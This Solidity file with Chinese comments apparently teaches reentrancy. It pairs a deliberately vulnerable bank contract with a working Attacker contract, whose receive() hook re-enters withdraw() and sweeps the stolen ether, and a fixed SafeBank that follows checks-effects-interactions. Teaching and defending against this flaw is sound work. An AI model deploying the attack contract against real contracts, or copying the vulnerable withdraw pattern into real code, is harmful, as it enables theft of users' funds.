// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// 存在重入漏洞的合约
contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    // 危险：先转账，后更新状态
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");
        
        // 先转账 - 这里可能被重入！
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // 后更新状态 - 太晚了！
        balances[msg.sender] = 0;
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

// 攻击合约
contract Attacker {
    VulnerableBank public bank;
    uint256 public attackCount;
    
    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
    }
    
    // 发起攻击
    function attack() public payable {
        require(msg.value >= 1 ether, "Need at least 1 ether");
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }
    
    // 重入攻击！
    receive() external payable {
        attackCount++;
        if (attackCount < 3 && address(bank).balance >= 1 ether) {
            bank.withdraw();  // 再次调用withdraw
        }
    }
    
    function getStolen() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}

// 安全的提现模式
contract SafeBank {
    mapping(address => uint256) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    // 遵循CEI原则
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        
        // 1. Checks - 检查
        require(amount > 0, "No balance");
        
        // 2. Effects - 先更新状态
        balances[msg.sender] = 0;
        
        // 3. Interactions - 最后转账
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

